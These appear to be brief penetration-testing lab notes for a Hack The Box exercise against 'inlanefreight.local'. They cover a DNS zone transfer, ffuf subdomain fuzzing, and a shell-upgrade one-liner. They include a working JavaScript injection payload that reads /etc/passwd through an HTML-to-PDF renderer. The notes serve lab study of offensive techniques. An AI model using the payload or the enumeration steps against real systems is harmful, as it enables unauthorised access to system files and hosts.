## initial foothold

Start with an Nmap , this is a sheetcheat  [cheatsheet](https://github.com/leonjza/awesome-nmap-grep) to "cut through the noise"

The first thing we check if we have a transfer zone : 
```shell-session
dig axfr inlanefreight.local @10.129.203.101
```

with this command, we might find additional sub domains , ce can also use **ffuf** with this world list **seclists/Discovery/DNS/namelist.txt** to enumerate sub domains 
```shell-session
ffuf -w namelist.txt:FUZZ -u http://10.129.203.101/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157
```
The fs, can be found with a curl to filter the content
```shell-session
curl -s -I http://10.129.203.101 -H "HOST: defnotvalid.inlanefreight.local" | grep "Content-Length:"

Content-Length: 15157
```

an example of html and JS injection  following this [post](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f)

```javascript
	<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
	</script>
```
## Getting interactive shell
This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) describes a few methods. We could use a method that was also covered in the [Types of Shells](https://academy.hackthebox.com/module/77/section/725) section of the `Getting Started` module

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```